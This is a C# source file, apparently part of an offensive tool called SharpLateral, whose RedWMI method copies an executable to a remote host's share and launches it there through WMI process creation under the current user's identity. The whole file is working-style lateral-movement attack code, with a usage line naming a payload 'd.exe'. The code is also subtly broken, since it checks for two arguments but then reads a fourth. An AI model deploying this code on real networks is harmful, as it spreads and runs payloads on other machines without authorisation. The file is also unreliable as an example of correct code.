using System;
using System.IO;
using System.Management;
using System.Security.Principal;

namespace SharpLateral
{
    class RedWMI
    {
        public static void Redwmi1(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: SharpLateral redwmi Client2 C:\\Users\\Administrator\\Desktop\\d.exe");
                return;
            }

            string hedefIp = args[0];
            string dosyaYolu = args[1];
            string yoll = args[3];

            string dosyaAdi = Path.GetFileName(dosyaYolu);

            string hedefCShareYolu = string.Format(args[3], hedefIp, dosyaAdi);

            using (WindowsIdentity mevcutKullanici = WindowsIdentity.GetCurrent())
            {
                File.Copy(dosyaYolu, hedefCShareYolu);

                ConnectionOptions baglantiSecenekleri = new ConnectionOptions();
                baglantiSecenekleri.Impersonation = ImpersonationLevel.Impersonate;
                ManagementScope kapsam = new ManagementScope(string.Format(@"\\{0}\root\cimv2", hedefIp), baglantiSecenekleri);
                kapsam.Connect();

                ManagementClass processClass = new ManagementClass(kapsam, new ManagementPath("Win32_Process"), new ObjectGetOptions());
                ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = hedefCShareYolu;
                ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
            }

            Console.WriteLine("File copied and executed succesfully via WMI.");
        }
    }
}